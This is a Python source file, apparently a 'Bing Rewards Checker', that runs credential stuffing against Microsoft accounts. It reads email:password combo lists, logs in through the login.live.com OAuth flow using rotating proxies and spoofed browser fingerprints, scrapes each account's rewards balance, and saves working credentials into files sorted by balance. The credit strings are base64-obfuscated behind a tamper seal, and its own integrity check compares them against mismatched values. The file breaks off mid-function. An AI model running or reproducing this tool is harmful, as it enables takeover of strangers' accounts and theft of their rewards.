import os, re, sys, json, time, base64, random, string, hashlib
import threading, configparser, urllib3, urllib.parse
from datetime import datetime
from urllib.parse import parse_qs
from concurrent.futures import (ThreadPoolExecutor, as_completed,
                                 wait, FIRST_COMPLETED)

try:
    from curl_cffi import requests as requests
    _HAVE_CFFI = True
except ImportError:
    import requests
    _HAVE_CFFI = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_F1T = "QmluZyBSZXdhcmRz"
_F2T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "UkVXQVJEU19AZXllbGlmdGVy"
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.rewards.seal")
_SEALED = None


def _d(e):
    pad = "=" * (-len(e) % 4)
    return base64.b64decode(e + pad).decode("utf-8")


def _j(*p):
    return "".join(_d(x) for x in p)


TOOL = _j(_F1T, _F2T)
TG_USER = _j(_F1A, _F2A)
TG_CHAN = _j(_F1C, _F2C)
RESULTS = _j(_F1D)
SEAL_STR = _j(_F1S, _F2S)
LINE_TAG = f"by {TG_USER} | {TG_CHAN}"


def verify(ctx="x"):
    global _SEALED
    if _SEALED is True:
        return True
    if TOOL != "Bing Rewards Checker":
        raise RuntimeError("eyelifter: credit stripped.")
    if TG_USER != "@samvir1" or TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if RESULTS != "REWARDS_@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if SEAL_STR != "locked-by-eyelifter-2026":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(_SEAL):
        try:
            st = open(_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched.")
    else:
        try:
            open(_SEAL, "w").write(fp)
        except OSError:
            pass
    _SEALED = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def color(c, s, b=False):
    return s if not _ANSI else f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
       "HIT": ("32", True), "FREE": ("36", False), "LOCKED": ("35", True)}
_CL = threading.Lock()

_PROGRESS_ON = False
_PROGRESS_LOCK = threading.Lock()
_PROGRESS_LAST = 0


def _clear_progress():
    global _PROGRESS_LAST
    if not _PROGRESS_ON:
        return
    with _PROGRESS_LOCK:
        if _PROGRESS_LAST:
            sys.stdout.write("\r" + " " * _PROGRESS_LAST + "\r")
            sys.stdout.flush()
            _PROGRESS_LAST = 0


def _draw_progress():
    global _PROGRESS_LAST
    if not _PROGRESS_ON:
        return
    with _LK:
        s = dict(_ST)
    el = time.time() - _START
    spd = s["checked"] / max(el, 0.001)
    line = (f"  [{s['checked']}/{_TOTAL}]  "
            f"hit={s['hit']}  free={s['free']}  bad={s['bad']}  "
            f"lock={s['locked']}  js={s['jsreq']}  2fa={s['2fa']}  "
            f"err={s['errors']}  rl={s['rl']}  "
            f"|  {spd:.1f}/s  |  {el:.0f}s")
    with _PROGRESS_LOCK:
        pad = max(0, _PROGRESS_LAST - len(line))
        sys.stdout.write("\r" + line + " " * pad)
        sys.stdout.flush()
        _PROGRESS_LAST = len(line)


def _progress_loop():
    while _PROGRESS_ON and not _STOP.is_set():
        _draw_progress()
        if _STOP.wait(1.5):
            break
    _clear_progress()


def log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        _clear_progress()
        if _ANSI:
            print(f"{color('90', ts)} {emoji}  "
                  f"{color(code, f'{level:7s}', bold)}  "
                  f"{color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def rline(i, t, st, txt, c, bold=False):
    with _CL:
        _clear_progress()
        if _ANSI:
            print(f"{color('90', f'[{i}/{t}]')} "
                  f"{color(c, st.ljust(7), bold)} {txt}", flush=True)
        else:
            print(f"[{i}/{t}] {st.ljust(7)} {txt}", flush=True)


def section(t, w=68):
    print()
    lbl = f" {t} "
    side = max(1, (w - len(lbl)) // 2)
    print(color("90", "─" * side) + color("96", lbl, True)
          + color("90", "─" * (w - len(lbl) - side)))


def banner(t, sub=None, w=68):
    print()
    line = "═" if _ANSI else "="
    print(color("90", line * w))
    print(color("96", t.center(w), True))
    if sub:
        print(color("2", sub.center(w)))
    print(color("5", f"eyelifter · {TG_USER} · {TG_CHAN}".center(w)))
    print(color("90", line * w))


def summary(rows):
    print()
    print(color("96", f"═══ eyelifter · {TG_USER} · {TG_CHAN} ═══", True))
    if rows:
        wk = max(len(str(k)) for k, _ in rows)
        for k, v in rows:
            print(f"  {color('96', str(k).ljust(wk))}  {color('0', str(v))}")
    print(color("96", "════════════════════════════════", True))


CFG_PATH = os.path.join(
    os.environ.get("REWARDS_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_rewards.ini"
)
MAX_THREADS = 200


class Cfg:
    def __init__(self, cf=CFG_PATH):
        self.cf = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.s = {}
        self.load()

    def load(self):
        if not os.path.exists(self.cf):
            self._default()
        try:
            self.cp.read(self.cf, encoding="utf-8")
        except Exception:
            self._default()
            self.cp.read(self.cf, encoding="utf-8")
        if "rewards" not in self.cp:
            self.cp["rewards"] = {}
        c = self.cp["rewards"]
        self.s["threads"] = max(1, min(MAX_THREADS, c.getint("threads", 50)))
        self.s["timeout"] = max(5, min(120, c.getint("timeout", 30)))
        self.s["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.s["retries"] = max(0, min(5, c.getint("retries", 1)))
        self.s["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 1.2)))
        self.s["rate_limit_delay"] = max(1, min(180, c.getint("rate_limit_delay", 15)))
        self.s["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.s["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.s["debug"] = c.getboolean("debug", False)
        self.s["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.s["show_progress"] = c.getboolean("show_progress", True)

    def _default(self):
        self.cp["rewards"] = {
            "threads": "50", "timeout": "30", "proxies_file": "proxies.txt",
            "retries": "1", "combo_delay": "1.2", "rate_limit_delay": "15",
            "skip_proxy_test": "false", "open_channel_on_launch": "true",
            "debug": "false", "hit_spacer": "true", "show_progress": "true",
        }
        with open(self.cf, "w", encoding="utf-8") as f:
            self.cp.write(f)

    def save(self):
        if "rewards" not in self.cp:
            self.cp["rewards"] = {}
        for k, v in self.s.items():
            self.cp["rewards"][k] = str(v)
        with open(self.cf, "w", encoding="utf-8") as f:
            self.cp.write(f)


_CFG = Cfg()

UA_POOL = [
    ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36", "?1", '"Android"'),
    ("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", "?1", '"Android"'),
    ("Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", "?1", '"Android"'),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "?0", '"Windows"'),
]


def pick_ua():
    return random.choice(UA_POOL)


def new_session():
    ua, mob, plat = pick_ua()
    if _HAVE_CFFI and "Android" not in ua:
        try:
            s = requests.Session(impersonate="chrome131")
        except Exception:
            s = requests.Session()
    else:
        s = requests.Session()
    s.verify = False
    s.headers.update({
        "user-agent": ua,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": '"Chromium";v="131", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": mob,
        "sec-ch-ua-platform": plat,
        "upgrade-insecure-requests": "1",
    })
    return s


_LK = threading.Lock()
_PK = threading.Lock()
_FK = threading.Lock()
_IK = threading.Lock()
_RL = threading.Lock()
_STOP = threading.Event()

_ST = {"checked": 0, "hit": 0, "free": 0, "bad": 0,
       "locked": 0, "jsreq": 0, "2fa": 0, "errors": 0, "rl": 0, "pfails": 0}
_START = time.time()
_TOTAL = 0
_POOL = []
_BADP = set()
_COOLP = {}
_INUSE = set()
_RLU = 0.0
_FOLDER = None
_DBG_DIR = None
_FREE_F = _BAD_F = _LOCKED_F = _JSREQ_F = _2FA_F = _ERR_F = _JSON_F = None
_BUCKET_FILES = {}
_BUCKET_COUNTS = {}
_BUCKET_LOCK = threading.Lock()

_BUCKET_ORDER = ["1-1000", "1000-2000", "2000-3000", "3000-4000",
                 "4000-5000", "5000-6000", "6000-7000", "7000-8000",
                 "8000-9000", "9000-10000", "10000-15000",
                 "15000-20000", "20000-30000", "30000-50000",
                 "50000-100000", "100000+"]


def reset_stats():
    global _ST, _START, _COOLP, _BADP, _RLU, _BUCKET_FILES, _BUCKET_COUNTS
    with _LK:
        _ST = {"checked": 0, "hit": 0, "free": 0, "bad": 0,
               "locked": 0, "jsreq": 0, "2fa": 0, "errors": 0, "rl": 0, "pfails": 0}
        _START = time.time()
    with _PK:
        _COOLP = {}
        _BADP = set()
    with _RL:
        _RLU = 0.0
    with _IK:
        _INUSE.clear()
    with _BUCKET_LOCK:
        _BUCKET_FILES = {}
        _BUCKET_COUNTS = {}


def pick_proxy(exclude=None):
    now = time.time()
    with _PK:
        avail = [p for p in _POOL
                 if p not in _BADP and _COOLP.get(p, 0.0) <= now]
    with _IK:
        free = [p for p in avail if p not in _INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _IK:
            _INUSE.add(p)
    return p


def rel_proxy(p):
    if not p:
        return
    with _IK:
        _INUSE.discard(p)


def bad_proxy(p):
    if not p:
        return
    with _PK:
        if p in _BADP:
            return
        _BADP.add(p)
    with _LK:
        _ST["pfails"] += 1


def cool_proxy(p, secs=120):
    if not p:
        return
    with _PK:
        _COOLP[p] = time.time() + secs


def rl_backoff(s):
    global _RLU
    with _RL:
        _RLU = max(_RLU, time.time() + s)


def rl_wait():
    while not _STOP.is_set():
        with _RL:
            gap = _RLU - time.time()
        if gap <= 0:
            return
        if _STOP.wait(min(gap, 1.0)):
            return


def sw(fh, text):
    if fh is None:
        return
    with _FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def parse_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    p = line.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    return None


def load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p},
              "timeout": 8, "verify": False}
        if _HAVE_CFFI:
            kw["impersonate"] = "chrome131"
        r = requests.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good, done, dead = [], [0], [0]
    lock = threading.Lock()
    log("🌐", "STEP", "PROXY", f"testing {total}")

    def probe(p):
        ok = test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            else:
                dead[0] += 1
            if done[0] % 20 == 0 or done[0] == total:
                log("🔎", "STEP", "PROXY",
                    f"{done[0]}/{total} — {len(good)} live")
        return ok

    with ThreadPoolExecutor(max_workers=min(80, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in proxies]):
            try:
                f.result()
            except Exception:
                pass
    if not good:
        log("⚠️", "WARN", "PROXY", f"0/{total} live — running direct")
        return []
    return good


def folder():
    global _FOLDER, _DBG_DIR
    if _FOLDER:
        return _FOLDER
    root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_FOLDER, exist_ok=True)
    _DBG_DIR = os.path.join(_FOLDER, "Debug")
    os.makedirs(_DBG_DIR, exist_ok=True)
    return _FOLDER


def save_dbg(name, text):
    if not _CFG.s.get("debug", False):
        return
    folder()
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:150]
    try:
        with open(os.path.join(_DBG_DIR, f"{safe}.txt"), "w", encoding="utf-8") as f:
            f.write(text or "")
    except Exception:
        pass


def balance_bucket(bal):
    if bal <= 0:
        return None
    if bal < 1000:
        return "1-1000"
    if bal < 2000:
        return "1000-2000"
    if bal < 3000:
        return "2000-3000"
    if bal < 4000:
        return "3000-4000"
    if bal < 5000:
        return "4000-5000"
    if bal < 6000:
        return "5000-6000"
    if bal < 7000:
        return "6000-7000"
    if bal < 8000:
        return "7000-8000"
    if bal < 9000:
        return "8000-9000"
    if bal < 10000:
        return "9000-10000"
    if bal < 15000:
        return "10000-15000"
    if bal < 20000:
        return "15000-20000"
    if bal < 30000:
        return "20000-30000"
    if bal < 50000:
        return "30000-50000"
    if bal < 100000:
        return "50000-100000"
    return "100000+"


def bucket_key(b):
    try:
        return _BUCKET_ORDER.index(b)
    except ValueError:
        return 99


def get_bucket_file(bucket):
    with _BUCKET_LOCK:
        if bucket not in _BUCKET_FILES:
            path = os.path.join(_FOLDER, f"rewards_hits_{bucket}.txt")
            fh = open(path, "w", encoding="utf-8")
            fh.write(f"# Bing Rewards Checker by eyelifter - {datetime.now().isoformat()}\n")
            fh.write(f"# Balance range: {bucket}\n")
            fh.write(f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n\n")
            _BUCKET_FILES[bucket] = fh
            _BUCKET_COUNTS[bucket] = 0
        _BUCKET_COUNTS[bucket] += 1
        return _BUCKET_FILES[bucket]


def fenc(d):
    return "&".join(f"{urllib.parse.quote(str(k))}={urllib.parse.quote(str(v))}"
                    for k, v in d.items())


def extract_ppft(html):
    if not html:
        return None, None
    ppft = urlpost = None
    for pat in (r'"sFT"\s*:\s*"([^"]+)"',
                r'value=\\\\"(.+?)\\\\"',
                r'value=\\"(.+?)\\"',
                r'name="PPFT"[^>]*value="([^"]+)"',
                r'value="([^"]+)"[^>]*name="PPFT"'):
        m = re.search(pat, html, re.S)
        if m:
            ppft = m.group(1)
            break
    m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
    if m:
        urlpost = m.group(1)
        urlpost = urlpost.replace("\\u0026", "&").replace("\\/", "/").replace("\\", "")
    return ppft, urlpost


def extract_frag_token(history):
    for h in history:
        hurl = h.url or ""
        if "#" not in hurl:
            continue
        q = parse_qs(hurl.split("#", 1)[1])
        t = (q.get("access_token") or [""])[0]
        if t and t.startswith("Ew") and len(t) > 100:
            return t
    return None


def extract_fmhf_form(html):
    if not html:
        return None, None
    h2 = re.sub(r'<noscript[^>]*>.*?</noscript>', '', html,
                flags=re.DOTALL | re.IGNORECASE)
    m = re.search(r'<form\s+name="fmHF"[^>]*>', h2)
    if not m:
        return None, None
    action_m = re.search(r'action="([^"]+)"', m.group(0))
    if not action_m:
        return None, None
    action = action_m.group(1).replace("&amp;", "&")
    fs = m.start()
    fe = h2.find("</form>", fs)
    if fe < 0:
        return None, None
    form_html = h2[fs:fe]
    fields = {}
    for inp in re.finditer(r'<input([^>]*)/?>', form_html, re.IGNORECASE):
        attrs = inp.group(1)
        n = re.search(r'name="([^"]+)"', attrs)
        v_ = re.search(r'value="([^"]*)"', attrs)
        if n:
            fields[n.group(1)] = v_.group(1) if v_ else ""
    return action, fields


def auth_xbox(email, password, proxy=None):
    s = new_session()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    auth_url = (
        "https://login.live.com/oauth20_authorize.srf"
        "?client_id=00000000402B5328"
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
        "&display=touch&response_type=token&locale=en"
    )
    try:
        r = s.get(auth_url, allow_redirects=True, timeout=_CFG.s["timeout"])
    except Exception as e:
        return None, None, f"net_{type(e).__name__}"
    save_dbg(f"01_auth_{email}", r.text)

    if r.status_code == 429:
        return None, None, "rate_limit"
    if r.status_code in (502, 503, 504):
        return None, None, "rate_limit"

    ppft, urlpost = extract_ppft(r.text)
    if not (ppft and urlpost):
        return None, None, "no_ppft"

    try:
        r2 = s.post(urlpost, data=fenc({"login": email, "loginfmt": email,
                                          "passwd": password, "PPFT": ppft}),
                    headers={"content-type": "application/x-www-form-urlencoded",
                             "origin": "https://login.live.com",
                             "referer": auth_url},
                    allow_redirects=True, timeout=_CFG.s["timeout"])
    except Exception as e:
        return None, None, f"post_{type(e).__name__}"
    save_dbg(f"02_submit_{email}", r2.text)

    if r2.status_code == 429:
        return None, None, "rate_limit"
    if r2.status_code in (502, 503, 504):
        return None, None, "rate_limit"

    tok = extract_frag_token(list(r2.history) + [r2])
    if tok:
        return tok, s, None

    body_low = (r2.text or "").lower()
    if "javascript required" in body_low:
        return None, None, "js_required"
    if "password is incorrect" in body_low or "account doesn't exist" in body_low:
        return None, None, "wrong_password"
    if any(x in body_low for x in ["recover?mkt", "verify your identity",
                                    "unusual activity", "two-step",
                                    "authenticator"]):
        return None, None, "2fa"
    if "account has been locked" in body_low or "too many attempts" in body_low:
        return None, None, "locked"
    if "consentinfoserverdata" in body_low:
        return None, None, "js_required"
    return None, None, "no_token"


def walk_rewards(sess, email, max_hops=15):
    try:
        cur = sess.get(
            "https://rewards.bing.com/dashboard",
            params={"form": "ML2XTO", "OCID": "ML2XTO",
                    "PUBL": "RewardsDO", "PROGRAMNAME": "WELCOMEPAGE",
                    "CREA": "ML2XTO"},
            allow_redirects=False, timeout=_CFG.s["timeout"])
    except Exception as e:
        return None, None, f"net_{type(e).__name__}"
    save_dbg(f"03_dash_{email}", cur.text or "")

    for hop in range(1, max_hops + 1):
        if _STOP.is_set():
            return None, None, "stopped"
        cur_url = cur.url or ""
        loc = cur.headers.get("Location", "") if hasattr(cur, "headers") else ""
        body = cur.text or ""

        if cur.status_code == 429:
            return None, None, "rate_limit"
        if cur.status_code in (502, 503, 504):
            return None, None, "rate_limit"

        if cur.status_code in (301, 302, 303, 307, 308) and loc:
            nxt = loc if loc.startswith("http") else urllib.parse.urljoin(cur_url, loc)
            try:
                cur = sess.get(nxt, allow_redirects=False,
                               timeout=_CFG.s["timeout"],
                               headers={"referer": cur_url})
                save_dbg(f"04_hop{hop}_{email}", cur.text or "")
                continue
            except Exception:
                return None, None, f"walk_net_{hop}"

        action, fields = extract_fmhf_form(body)
        if action and fields:
            try:
                cur = sess.post(action, data=fenc(fields),
                                headers={"content-type": "application/x-www-form-urlencoded",
                                         "origin": "https://login.live.com",
                                         "referer": cur_url},
                                allow_redirects=False,
                                timeout=_CFG.s["timeout"])
                save_dbg(f"05_fmhf{hop}_{email}", cur.text or "")
                continue
            except Exception:
                return None, None, f"fmhf_net_{hop}"

        if cur.status_code == 200:
            return cur, body, None

        return None, None, f"walk_status_{cur.status_code}"

    return None, None, "max_hops"


def unescape_rsc(s):
    out = []
    i = 0
    while i < len(s):
        c = s[i]
        if c == "\\" and i + 1 < len(s):
            n = s[i + 1]
            if n == "n":
                out.append("\n"); i += 2; continue
            if n == "t":
                out.append("\t"); i += 2; continue
            if n == "r":
                out.append("\r"); i += 2; continue
            if n == "\\":
                out.append("\\"); i += 2; continue
            if n == '"':
                out.append('"'); i += 2; continue
            if n == "/":
                out.append("/"); i += 2; continue
            if n == "u" and i + 5 < len(s):
                try:
                    out.append(chr(int(s[i + 2:i + 6], 16)))
                    i += 6; continue
                except ValueError:
                    pass
            out.append(n); i += 2; continue
        out.append(c); i += 1
    return "".join(out)


def extract_rewards(html, email):
    out = {}
    chunks = re.findall(r'self\.__next_f\.push\(\[1,\s*"((?:[^"\\]|\\.)*)"\]\)',
                        html or "")
    if not chunks:
        return out
    decoded = unescape_rsc("".join(chunks))

    m = re.search(r'"balance"\s*:\s*(\d+)\s*,\s*"level"\s*:\s*(\d+)', decoded)
    if m:
        out["balance"] = int(m.group(1))
        out["level"] = int(m.group(2))
    else:
        m = re.search(r'"balance"\s*:\s*(\d+)', decoded)
        if m:
            out["balance"] = int(m.group(1))
        m = re.search(r'"level"\s*:\s*(\d+)', decoded)
        if m:
            out["level"] = int(m.group(1))

    m = re.search(r'"streak"\s*:\s*\{([^{}]{1,2000})\}', decoded)
    if m:
        s_obj = m.group(1)
        for key in ("activitiesCompleted", "completedDays", "currentDay",
                    "totalDays", "pointsPerSearch", "streakBonus",
                    "streakCounter", "daysMax", "remainingDays"):
            km = re.search(rf'"{key}"\s*:\s*(\d+)', s_obj)
            if km:
                out[f"streak_{key}"] = int(km.group(1))

    for k, kk in (("points_requirement", "pointsRequirement"),
                  ("points_progress", "pointsProgress"),
                  ("points_remaining", "pointsRemaining"),
                  ("target_level", "targetLevel"),
                  ("prev_points_earned", "prevPointsEarned"),
                  ("prev_points_max", "prevPointsMax")):
        m = re.search(rf'"{kk}"\s*:\s*(\d+)', decoded)
        if m:
            out[k] = int(m.group(1))

    m = re.search(r'"memberTitle"\s*:\s*"([^"]+)"', decoded)
    if m:
        out["member_title"] = m.group(1)

    m = re.search(r'"couponCount"\s*:\s*(\d+)', decoded)
    if m:
        out["coupon_count"] = int(m.group(1))

    skus = sorted(set(re.findall(r'\b(\d{12})\b', decoded)))
    out["sku_count"] = len(skus)
    if skus:
        out["skus"] = skus[:5]

    m = re.search(r'"displayName"\s*:\s*"([^"]{2,60})"', decoded)
    if m:
        out["display_name"] = m.group(1)

    save_dbg(f"06_rsc_{email}", decoded)
    return out


def level_name(n):
    return {1: "Member", 2: "Silver", 3: "Gold"}.get(n, f"L{n}")


class Result:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.status = "unknown"
        self.reason = ""
        self.balance = None
        self.level = None
        self.member_title = None
        self.country = None
        self.streak = None
        self.streak_max = None
        self.pps = None
        self.streak_bonus = None
        self.target_level = None
        self.points_progress = None
        self.points_requirement = None
        self.prev_earned = None
        self.prev_max = None
        self.coupon_count = None
        self.sku_count = None
        self.display_name = None


def check_combo(combo, proxy=None):
    if ":" not in combo:
        r = Result(combo, "")
        r.status = "bad"
        r.reason = "malformed"
        return r
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()
    r = Result(email, password)

    tok, sess, err = auth_xbox(email, password, proxy)

    if err == "rate_limit":
        r.status = "error"
        r.reason = "rate_limit"
        return r
    if err == "wrong_password":
        r.status = "bad"
        r.reason = "wrong_password"
        return r
    if err == "2fa":
        r.status = "2fa"
        r.reason = "2fa"
        return r
    if err == "locked":
        r.status = "locked"
        r.reason = "locked"
        return r
    if err == "js_required":
        r.status = "jsreq"
        r.reason = "js_required"
        return r
    if err or not tok:
        r.status = "error"
        r.reason = err or "no_token"
        return r

    resp, body, werr = walk_rewards(sess, email)
    if werr == "rate_limit":
        r.status = "error"
        r.reason = "rate_limit"
        return r
    if werr:
        r.status = "error"
        r.reason = f"walk_{werr}"
        return r

    if "__next_f" not in (body or ""):
        time.sleep(1.0)
        try:
            ref = sess.get(resp.url, allow_redirects=True,
                           timeout=_CFG.s["timeout"])
            if ref.status_code == 200 and "__next_f" in (ref.text or ""):
                resp = ref
                body = ref.text
                save_dbg(f"07_refetch_{email}", body)
        except Exception:
            pass

    data = extract_rewards(body, email)
    if not data or "balance" not in data:
        r.status = "error"
        r.reason = "no_rsc_data"
        return r

    r.balance = data.get("balance", 0)
    r.level = data.get("level")
    r.member_title = data.get("member_title")
    r.country = data.get("country")
    r.streak = data.get("streak_streakCounter") or data.get("streak_currentDay")
    r.streak_max = data.get("streak_totalDays")
    r.pps = data.get("streak_pointsPerSearch")
    r.streak_bonus = data.get("streak_streakBonus")
    r.target_level = data.get("target_level")
    r.points_progress = data.get("points_progress")
    r.points_requirement = data.get("points_requirement")
    r.prev_earned = data.get("prev_points_earned")
    r.prev_max = data.get("prev_points_max")
    r.coupon_count = data.get("coupon_count")
    r.sku_count = data.get("sku_count")
    r.display_name = data.get("display_name")

    if r.balance > 0:
        r.status = "hit"
    else:
        r.status = "free"
    return r


def record(result):
    st = result.status
    with _LK:
        _ST["checked"] += 1
        done = _ST["checked"]
        if st == "hit":
            _ST["hit"] += 1
        elif st == "free":
            _ST["free"] += 1
        elif st == "bad":
            _ST["bad"] += 1
        elif st == "locked":
            _ST["locked"] += 1
        elif st == "jsreq":
            _ST["jsreq"] += 1
        elif st == "2fa":
            _ST["2fa"] += 1
        else:
            _ST["errors"] += 1
        total = _TOTAL

    cc = f"{result.email}:{result.password}"
    sp = "\n\n" if _CFG.s.get("hit_spacer", True) else "\n"

    if st == "hit":
        bucket = balance_bucket(result.balance or 0)
        parts = [f"HIT {cc}", f"Bal={result.balance}"]
        if result.level is not None:
            parts.append(f"Lvl={result.level}({level_name(result.level)})")
        if result.points_progress is not None and result.points_requirement:
            parts.append(f"Prog={result.points_progress}/{result.points_requirement}")
        if result.streak is not None and result.streak_max:
            parts.append(f"Streak={result.streak}/{result.streak_max}")
        if result.pps:
            parts.append(f"PPS={result.pps}")
        if result.streak_bonus:
            parts.append(f"Bonus={result.streak_bonus}")
        if result.prev_earned:
            parts.append(f"Prev={result.prev_earned}/{result.prev_max}")
        if result.member_title:
            parts.append(f"Title={result.member_title}")
        if result.coupon_count:
            parts.append(f"Coupons={result.coupon_count}")
        if result.sku_count:
            parts.append(f"SKUs={result.sku_count}")
        line = " | ".join(parts) + f" | {LINE_TAG}"

        rline(done, total, "HIT", line, "32", True)
        fh = get_bucket_file(bucket)
        sw(fh, line + sp)
        try:
            sw(_JSON_F, json.dumps({
                "email": result.email, "password": result.password,
                "balance": result.balance, "level": result.level,
                "level_name": level_name(result.level) if result.level else None,
                "target_level": result.target_level,
                "progress": f"{result.points_progress}/{result.points_requirement}",
                "streak": result.streak, "streak_max": result.streak_max,
                "points_per_search": result.pps,
                "streak_bonus": result.streak_bonus,
                "prev_earned": result.prev_earned, "prev_max": result.prev_max,
                "member_title": result.member_title, "country": result.country,
                "coupon_count": result.coupon_count,
                "sku_count": result.sku_count,
                "bucket": bucket,
            }, ensure_ascii=False) + "\n")
        except Exception:
            pass

    elif st == "free":
        parts = [f"FREE {cc}", "Bal=0"]
        if result.level is not None:
            parts.append(f"Lvl={result.level}({level_name(result.level)})")
        line = " | ".join(parts) + f" | {LINE_TAG}"
        rline(done, total, "FREE", line, "36")
        sw(_FREE_F, line + sp)

    elif st == "bad":
        line = f"BAD {cc} | {result.reason or 'invalid'} | {LINE_TAG}"
        rline(done, total, "BAD", line, "31")
        sw(_BAD_F, line + sp)

    elif st == "locked":
        line = f"LOCKED {cc} | {result.reason or 'locked'} | {LINE_TAG}"
        rline(done, total, "LOCKED", line, "35", True)
        sw(_LOCKED_F, line + sp)

    elif st == "jsreq":
        line = f"JSREQ {cc} | {result.reason or 'js_required'} | {LINE_TAG}"
        rline(done, total, "JSREQ", line, "33")
        sw(_JSREQ_F, line + sp)

    elif st == "2fa":
        line = f"2FA {cc} | {result.reason or '2fa'} | {LINE_TAG}"
        rline(done, total, "2FA", line, "33")
        sw(_2FA_F, line + sp)

    else:
        line = f"ERR {cc} | {result.reason or 'unknown'} | {LINE_TAG}"
        rline(done, total, "ERR", line, "31")
        sw(_ERR_F, line + sp)


def run_one(combo):
    if _STOP.is_set():
        return
    gap = _CFG.s.get("combo_delay", 1.2)
    if gap > 0 and _STOP.wait(gap * (0.5 + random.random())):
        return
    rl_wait()
    if _STOP.is_set():
        return

    proxy = pick_proxy() if _POOL else None
    attempts = _CFG.s.get("retries", 1) + 1
    last = None

    try:
        for a in range(attempts):
            if _STOP.is_set():
                break
            try:
                result = check_combo(combo, proxy)
            except Exception as e:
                result = Result(combo.split(":", 1)[0], "")
                result.status = "error"
                result.reason = f"crash_{type(e).__name__}"

            if result.status in ("hit", "free", "bad", "locked", "jsreq", "2fa"):
                last = result
                break

            et = result.reason or ""
            is_last = a == attempts - 1

            if et == "rate_limit":
                with _LK:
                    _ST["rl"] += 1
                if proxy:
                    cool_proxy(proxy, 180)
                w = min(_CFG.s.get("rate_limit_delay", 15) * (2 ** a), 90)
                rl_backoff(w)
                if not proxy:
                    last = result
                    break
                if is_last:
                    break
                if _STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if "net_" in et or "no_ppft" in et or "walk_status" in et:
                if proxy:
                    bad_proxy(proxy)
                if not is_last and _STOP.wait(1.0 + random.random()):
                    break
                continue

            last = result
            break
    finally:
        if proxy:
            rel_proxy(proxy)

    if last is None:
        last = Result(combo.split(":", 1)[0], "")
        last.status = "error"
        last.reason = "no_result"

    try:
        record(last)
    except Exception:
        pass


def _submit_batch(ex, combos, threads):
    cap = max(threads * 4, 200)
    inflight = set()
    for i in range(0, len(combos), cap):
